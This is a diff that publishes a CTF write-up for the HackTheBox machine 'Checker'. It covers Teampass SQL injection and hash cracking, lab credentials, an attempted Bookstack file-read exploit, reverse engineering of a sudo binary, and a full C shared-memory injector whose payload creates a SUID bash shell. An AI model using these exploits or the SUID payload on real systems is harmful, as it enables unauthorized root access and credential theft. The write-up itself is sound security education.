@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Checker - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Checker.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Checker machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Checker machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Checker, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,227 @@
         <h1 class="writeup-title">Checker</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">May 31, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Checker" src="../images/Checker/pwned.png" /></p>
-<p>Checker is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Checker retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Checker/pwned.png" />                                                                                                                                                                                                                         </p>
+<p>Checker was a unique Linux box that started with open ports for SSH (22), HTTP (80), and an additional web service (8080).
+The port 8080 hosted a Teampass password manager vulnerable to SQL injection (CVE-2023-1545), which leaked bcrypt hashes for users bob and admin.</p>
+<p>After cracking the hash to reveal the password "cheerleader", I gained access to Teampass and discovered SSH credentials for user "reader" along with Bookstack login details.
+SSH access required two-factor authentication via Google Authenticator codes.
+While the intended path involved exploiting a blind Bookstack SSRF-LFR vulnerability (CVE-2023-6199) to leak the TOTP seed, I was unable to get this exploit working despite extensive attempts with various payloads, configurations and ideas.</p>
+<p>For root access, I analyzed a custom hash-checker binary that the reader user could execute via sudo.
+Through reverse engineering with Ghidra, I discovered the binary used shared memory segments with a critical 1-second delay between writing data and processing it.
+This created a Time-of-Check-Time-of-Use (TOCTOU) vulnerability. I exploited this by writing a C program that poisoned shared memory segments with SQL injection payloads during the timing window.
+The binary's notify_user function passed unsanitized shared memory contents directly to popen(), allowing command execution.
+By running the exploit in a loop alongside the hash checker, I successfully injected a payload that created a SUID bash binary for root access.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Checker/nmap.png" />                                                                                                                                                                                                                           </p>
+<p>Nmap scan reveals 3 open ports. Two websites on 80 and 8080, and SSH on 22.                                                                                                                                                                     </p>
+<h2>SQL injection in Teampass</h2>
+<p>I will begin by checking the website located at port 8080.</p>
+<p><img alt="teampass" src="../images/Checker/teampass.png" /></p>
+<p>Teampass is an open-source password manager service. I can't do anything here without credentials, so I'll search the web for any CVEs I could use.</p>
+<p><code>https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612</code></p>
+<p>I saved the PoC into a .sh file and ran it against Teampass.</p>
+<p><img alt="hash" src="../images/Checker/hash.png" /></p>
+<p>I'll copy both hashes into a file so that I can crack them with hashcat.</p>
+<p><img alt="cracked" src="../images/Checker/cracked.png" /></p>
+<p><code>bob | cheerleader</code></p>
+<p>With these credentials, I can login into Teampass.</p>
+<p><img alt="items" src="../images/Checker/items.png" /></p>
+<p>There are two items inside. Bookstack login and ssh access.</p>
+<p>Bookstack login:</p>
+<p><code>bob@checker.htb | mYSeCr3T_w1kI_P4sSw0rD</code></p>
+<p>SSH access:</p>
+<p><code>reader | hiccup-publicly-genesis</code></p>
+<p>Since I have credentials for SSH, I will try to login into the machine.</p>
+<p><img alt="code" src="../images/Checker/code.png" /></p>
+<p>It requires some kind of a verification code. That's my first time seeing code verification with SSH, and I don't think I can do much more here right now.</p>
+<h2>Leaking local files via Bookstack CVE</h2>
+<p>Since I also have credentials for Bookstack, I'm going to check it out at port 80.</p>
+<p><img alt="bookstack" src="../images/Checker/bookstack.png" /></p>
+<p>I can create books, but there is not much interesting stuff on the website. I'll take a look at the page source.</p>
+<p><img alt="version" src="../images/Checker/version.png" /></p>
+<p>With the newly uncovered version number, I went on to once again search for CVEs, this time for Bookstack.</p>
+<p><code>https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack</code></p>
+<p>I'll clone the provided repo onto my machine.</p>
+<p><code>https://github.com/pwnter/php_filter_chains_oracle_exploit.git</code></p>
+<p>I built this command with the data I've gathered(X-CSRF-TOKEN is labeled as "token" within the page source!)</p>
+<div class="codehilite"><pre><span></span><code>python filters_chain_oracle_exploit.py --target &#39;http://checker.htb/ajax/page/12/save-draft&#39; --verb PUT --parameter html --headers &#39;{&quot;Content-Type&quot;:&quot;application/json&quot;,&quot;Cookie&quot;:&quot;bookstack_session=cookie&quot;,&quot;X-CSRF-TOKEN&quot;:&quot;token&quot;}&#39; --file &#39;/etc/passwd&#39;
+</code></pre></div>
+
+<p><img alt="error" src="../images/Checker/error.png" /></p>
+<p>After much brainstorming and many different attempts and ideas, I was unable to leak any files. I know this is the intended way because I've had success the first time I solved it.</p>
+<p>If I ever find a way to make this work successfully again, I will update this writeup right away.</p>
+<p>Since I cannot showcase further steps for user, I'll simply outline what was left to do after this step:</p>
+<ol>
+<li>
+<p>Determine that google authenticator is used for SSH code verification</p>
+</li>
+<li>
+<p>Find the location of the authenticator config (via the Bookstack books and searching the web)</p>
+</li>
+<li>
+<p>Leak the seed of the generator and input it into a TOTP website, which will show the exact code to be used, which changes every 20 seconds.</p>
+</li>
+<li>
+<p>SSH as reader with the password and the appropriate code.</p>
+</li>
+</ol>
+<p><img alt="user" src="../images/Checker/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Trying to read the check_leak SHM data</h2>
+<p><img alt="sudol" src="../images/Checker/sudol.png" /></p>
+<p>Reader can run a hash-checker script. I'll take a look at it.</p>
+<p><img alt="shm" src="../images/Checker/shm.png" /></p>
+<p>It's using shared memory segments to hold data. Analysis via ipcs showed that the addresses are held for less than a second before disappearing.</p>
+<p>I created a small bash script to confirm that the shared memory is indeed written somewhere.</p>
+<p><img alt="check" src="../images/Checker/check.png" /></p>
+<p>I tried to read the saved memory contents in many ways, but everything is getting deleted too quickly for me to do anything more.</p>
+<p><img alt="leak" src="../images/Checker/leak.png" /></p>
+<p>After I checked root, I realized that this script works only on the users from Bookstack. Even if I manage to read the password somehow, it'll be just bob and no one else.</p>
+<p><img alt="home" src="../images/Checker/home.png" /></p>
+<p>Bob who isn't even a user on the machine! This confirms that the only thing I could achieve by (somehow) reading the memory contents would be rediscovering bob's Bookstack password which I already know.</p>
+<p>I decided to change my approach. Instead of trying to read the memory, I'll try to "poison" as many memory addresses as possible, hoping that the script will pick one of them to save the data.</p>
+<p>However, simply poisoning the addresses will be futile. If the called binary file is vulnerable in any way though, I should be able to adjust the poisoner payload and take advantage of that.</p>
+<p>I'll download the ELF binary onto my machine for some reverse engineering.</p>
+<p><code>scp reader@checker.htb:/opt/hash-checker/check_leak .</code></p>
+<h2>Reverse engineering the binary</h2>
+<p>I'll use Ghidra to decompile the binary. Starting from main, I'll go over each function to understand how it works and to search for any way to exploit it.</p>
+<h3>Analysis of the main function</h3>
+<p><img alt="ghidra1" src="../images/Checker/ghidra1.png" /></p>
+<p>It begins by setting variables from mysql environmental variables. If the credentials are missing, it errors out with <code>"Error: Missing database credentials in environment</code></p>
+<p>If the argument count is not equal to 2, it'll error out with the <code>Usage: &lt;USER&gt;</code> message.</p>
+<p>If the username provided is longer than 20 characters, it'll error out with <code>Error: &lt;USER&gt; is too long. Maximum length is 20 characters</code></p>
+<p><img alt="ghidra2" src="../images/Checker/ghidra2.png" /></p>
+<p>It calls <code>fetch_hash_from_db</code> with the mysql credentials and the user. If the function returns 0, <code>User not found in the database.</code> is returned.</p>
+<p>If the user exists, it calls <code>check_bcrypt_in_file</code> to check for matches with anything from the leaked hashes list.</p>
+<p>If there are no matches found, it returns <code>User is safe</code>.</p>
+<p>However, if there's a match found' it'll return <code>Password is leaked!</code>.</p>
+<p>Afterwards it'll write the password hash to the shared memory address, and notify the user using the database credentials and the email from the database.</p>
+<p>It's worth noting that there is a 1 second delay between the shm write and the notify_user call.</p>
+<p>Lastly, It will clear the shared memory before exiting.</p>
+<h3>Analysis of the fetch_hash_from_db function</h3>
+<p><img alt="ghidra1" src="../images/Checker/ghidra3.png" /></p>
+<p>I was mistaken. This is a Teampass database, not a Bookstack one. It was an honest and easy mistake since both services had identical users.</p>
+<p><img alt="ghidra4" src="../images/Checker/ghidra4.png" /></p>
+<p>This function pulls the hash of whichever user is passed and returns either the hash or 0.</p>
+<p>There is an SQL injection vulnerability here, caused by the user input being passed into the query directly. However, I don't need these hashes at this point.</p>
+<h3>Analysis of the check_bcrypt_from_file function</h3>
+<p>This function takes 2 arguments. File path(1) and the password hash(2).</p>
+<p><img alt="ghidra5" src="../images/Checker/ghidra5.png" /></p>
+<p>If it cannot open the file, it'll return 0(User is safe).</p>
+<p><img alt="ghidra6" src="../images/Checker/ghidra6.png" /></p>
+<p>If there is a match between the hash(argument 2) and any hash from the file, it returns 1(Password is leaked!). </p>
+<h3>Analysis of the write_to_shm function</h3>
+<p>This function takes a single argument.</p>
+<p><img alt="ghidra7" src="../images/Checker/ghidra7.png" /></p>
+<p>It seeds the RNG with current time and then generates a random number to create a shared memory segment with it.</p>
+<p>Then it attaches to the newly created segment and checks it for errors.</p>
+<p>It takes the time again and transforms it into a readable format. It then writes the <code>Leaked hash detected at (time)</code> message into the memory.</p>
+<p>It turns out that it wasn't the hash that was being saved into shared memory, but rather this message along with the time of detection.</p>
+<p>Lastly, it detaches from memory and returns the shared memory address.</p>
+<h3>Analysis of the notify_user function</h3>
+<p>This function takes in the 4 database credentials, and the shm address as parameters.</p>
+<p><img alt="ghidra8" src="../images/Checker/ghidra8.png" /></p>
+<p>It gets the saved shm address from param 5. If there is no memory segment at the address to attach to, it displays <code>No shared memory segment found for the given address:</code></p>
+<p>If it cannot attach to the address, it'll show the <code>Unable to attach to shared memory segment with ID:</code> error.</p>
+<p><img alt="ghidra9" src="../images/Checker/ghidra9.png" /></p>
+<p>It then checks the contents saved under that address for the <code>Leaked hash detected</code> string. If it's not found, it'll error out with <code>No hash detected in shared memory</code>.</p>
+<p>If the contents are <code>Leaked hash detected</code> and <code>&gt;</code> and nothing else, the binary will exit with the <code>Malformed data in the shared memory.</code> error.</p>
+<p>But if there's something else as well, the contents will be shaped into a <code>Leaked hash detected&gt;(hash?)</code> format, then sent straight to the SQL query and into popen(!!!).</p>
+<p>If everything goes well, the program continues and eventually "notifies" the user by their email stored in the database.</p>
+<p>If I can escape the query, I'll be able to send commands straight into popen for command execution!</p>
+<h2>TOCTOU with SHM poisoning</h2>
+<p>Remembering that there is a 1 second of delay between <code>write_to_shm</code> and <code>notify_user</code> functions, I can create a script that will:</p>
+<ol>
+<li>
+<p>Attach to the SHM memory address.</p>
+</li>
+<li>
+<p>Overwrite the contents of that address to add my command.</p>
+</li>
+</ol>
+<p>All in the span of one second during the sleep delay.</p>
+<p>I'll use C for this since it requires both speed and memory attachment, both of which C excels at.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;stdlib.h&gt;</span>
+<span class="c1">#include &lt;sys/ipc.h&gt;</span>
+<span class="c1">#include &lt;sys/shm.h&gt;</span>
+<span class="c1">#include &lt;time.h&gt;</span>
+<span class="c1">#include &lt;errno.h&gt;</span>
+<span class="c1">#include &lt;string.h&gt;</span>
+
+<span class="c1">#define SHM_BYTES 0x400           // 1024 bytes</span>
+<span class="c1">#define SHM_PERMISSIONS 0x3B6     // 0666 octal</span>
+<span class="c1">#define PAYLOAD_MESSAGE &quot;Leaked hash detected Sat 31 5:33:55 2025 &gt; &#39;; cp /bin/bash /tmp/privesc &amp;&amp; chmod 4755 /tmp/privesc;#&quot;</span>
+
+<span class="o">//</span><span class="w"> </span><span class="n">Pretty</span><span class="w"> </span><span class="n">colors</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">output</span>
+<span class="c1">#define RED     &quot;\033[1;31m&quot;</span>
+<span class="c1">#define GREEN   &quot;\033[1;32m&quot;</span>
+<span class="c1">#define YELLOW  &quot;\033[1;33m&quot;</span>
+<span class="c1">#define RESET   &quot;\033[0m&quot;</span>
+
+<span class="nb nb-Type">void</span><span class="w"> </span><span class="n">panic</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nb nb-Type">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="nb nb-Type">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">YELLOW</span><span class="w"> </span><span class="s2">&quot;[::] Initiating shared memory injector </span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Seed</span><span class="w"> </span><span class="n">RNG</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">epoch</span><span class="w"> </span><span class="n">timestamp</span>
+<span class="w">    </span><span class="n">time_t</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="n">NULL</span><span class="p">);</span>
+<span class="w">    </span><span class="n">srand</span><span class="p">((</span><span class="n">unsigned</span><span class="w"> </span><span class="nb nb-Type">int</span><span class="p">)</span><span class="n">now</span><span class="p">);</span>
+<span class="w">    </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">entropy_spice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span>
+<span class="w">    </span><span class="n">key_t</span><span class="w"> </span><span class="n">shm_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entropy_spice</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mh">0xFFFFF</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">GREEN</span><span class="w"> </span><span class="s2">&quot;[+] Generated SHM key: 0x</span><span class="si">%X</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">,</span><span class="w"> </span><span class="n">shm_key</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Grab</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">segment</span>
+<span class="w">    </span><span class="nb nb-Type">int</span><span class="w"> </span><span class="n">shm_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">shmget</span><span class="p">(</span><span class="n">shm_key</span><span class="p">,</span><span class="w"> </span><span class="n">SHM_BYTES</span><span class="p">,</span><span class="w"> </span><span class="n">IPC_CREAT</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">SHM_PERMISSIONS</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">shm_id</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">panic</span><span class="p">(</span><span class="n">RED</span><span class="w"> </span><span class="s2">&quot;[-] shmget failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Attach</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">shared</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="n">space</span>
+<span class="w">    </span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="n">mem_view</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shm_id</span><span class="p">,</span><span class="w"> </span><span class="n">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mem_view</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="p">(</span><span class="nb">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">panic</span><span class="p">(</span><span class="n">RED</span><span class="w"> </span><span class="s2">&quot;[-] shmat failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">GREEN</span><span class="w"> </span><span class="s2">&quot;[+] Connected to shared memory.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Write</span><span class="w"> </span><span class="n">payload</span>
+<span class="w">    </span><span class="n">snprintf</span><span class="p">(</span><span class="n">mem_view</span><span class="p">,</span><span class="w"> </span><span class="n">SHM_BYTES</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">PAYLOAD_MESSAGE</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">YELLOW</span><span class="w"> </span><span class="s2">&quot;[::] Injecting payload into memory...</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Echo</span><span class="w"> </span><span class="n">what</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">poisoned</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">SHM</span><span class="w"> </span><span class="n">with</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">GREEN</span><span class="w"> </span><span class="s2">&quot;[+] Payload written:</span><span class="se">\n</span><span class="si">%s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">,</span><span class="w"> </span><span class="n">mem_view</span><span class="p">);</span>
+
+<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">Clean</span><span class="w"> </span><span class="n">up</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">shmdt</span><span class="p">(</span><span class="n">mem_view</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">panic</span><span class="p">(</span><span class="n">RED</span><span class="w"> </span><span class="s2">&quot;[-] shmdt failed&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">YELLOW</span><span class="w"> </span><span class="s2">&quot;[::] Detached from memory. Mission complete.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="w"> </span><span class="n">RESET</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>I'll compile my script with <code>gcc -o shmpoisoner shmpoisoner.c</code></p>
+<p>Then, I'll run two while true; loops in two terminals.</p>
+<p>In the first terminal, I'll run <code>while true; do sudo /opt/hash-checker/check-leak.sh bob; done</code> to keep the binary running.</p>
+<p>In the second terminal, I'll keep running my exploit with <code>while true; do /tmp/shmpoisoner; done</code>.</p>
+<p><img alt="terminal1" src="../images/Checker/terminal1.png" /></p>
+<p><img alt="terminal2" src="../images/Checker/terminal2.png" /></p>
+<p>The SQL errors in the 1st terminal confirm that the injection was successful. In the 2nd terminal, privesc has been created.</p>
+<p><img alt="root" src="../images/Checker/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
